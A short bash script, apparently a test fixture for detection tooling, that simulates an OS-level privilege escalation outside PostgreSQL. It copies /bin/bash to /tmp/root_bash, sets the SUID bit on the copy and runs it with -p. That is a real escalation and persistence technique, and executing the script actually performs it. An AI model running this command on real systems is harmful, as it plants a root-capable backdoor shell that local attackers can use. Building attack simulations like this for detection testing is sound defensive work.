#!/bin/bash
echo "Simulating OS-only Privilege Escalation (Category 1)..."

# This attack happens entirely at the OS level, bypassing PostgreSQL.
# We simulate a host-level attacker obtaining an SUID bash shell or exploiting a local binary.
sh -c 'cp /bin/bash /tmp/root_bash && chmod +s /tmp/root_bash && /tmp/root_bash -p -c "whoami" > /dev/null 2>&1 || true'

echo "OS-only privilege escalation simulated."
